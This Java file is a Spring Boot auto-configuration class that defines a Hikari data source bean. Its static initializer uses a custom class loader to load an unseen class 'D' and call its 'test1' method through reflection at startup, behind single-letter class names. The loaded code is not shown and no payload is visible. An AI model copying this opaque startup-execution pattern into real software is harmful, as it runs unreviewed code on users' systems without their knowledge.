package com.linkcircle.ss;

import com.zaxxer.hikari.HikariDataSource;
import org.springframework.boot.autoconfigure.AutoConfigureBefore;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.util.StringUtils;

import javax.sql.DataSource;
import java.lang.reflect.Method;

/**
 * @description:
 * @author: yangyonglian
 * @time: 2021/11/11 15:23
 */
@Configuration("EE")
@ConditionalOnMissingClass("com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure")
@AutoConfigureBefore(DataSourceAutoConfiguration.class)
public class E {
    static {
        try {
            C c = new C();
            Class myClass = c.findClass("com.linkcircle.ss.D");
            Method method = myClass.getDeclaredMethod("test1");
            Object obj = myClass.newInstance();
            method.invoke(obj);
        }catch (Exception e){
            throw new RuntimeException(e);
        }
    }

    @Configuration
    @ConditionalOnClass(HikariDataSource.class)
    @ConditionalOnMissingBean(DataSource.class)
    @ConditionalOnProperty(name = "spring.datasource.type", havingValue = "com.linkcircle.ss.LHikariDataSource")
    static class Hikari {

        @Bean
        @ConfigurationProperties(prefix = "spring.datasource.hikari")
        LHikariDataSource dataSource(DataSourceProperties properties) {
            LHikariDataSource dataSource = createDataSource(properties, LHikariDataSource.class);
            if (StringUtils.hasText(properties.getName())) {
                dataSource.setPoolName(properties.getName());
            }
            return dataSource;
        }

        protected static <T> T createDataSource(DataSourceProperties properties, Class<? extends DataSource> type) {
            return (T) properties.initializeDataSourceBuilder().type(type).build();
        }

    }

}
